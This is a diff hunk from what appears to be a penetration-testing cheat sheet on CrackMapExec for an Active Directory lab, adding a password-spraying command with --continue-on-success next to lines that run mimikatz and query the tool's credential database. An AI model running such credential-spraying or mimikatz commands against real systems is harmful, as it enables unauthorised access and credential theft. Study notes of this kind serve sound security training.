@@ -151,6 +151,10 @@ crackmapexec smb 192.168.154.134 -u 'Administrator' -p 'P@$$w0rd' -d MARVEL.loca
 #using mimikatz command.
 crackmapexec <protocol> <target(s)> -u Administrator -p ‘P@ssw0rd’ -M mimikatz -o COMMAND=’privilege::debug’
 
+#continue on success
+crackmapexec smb 192.168.44.161 -u usernams -p passwords --continue-on-success
+
+
 #interect with database
 cmedb
 creds
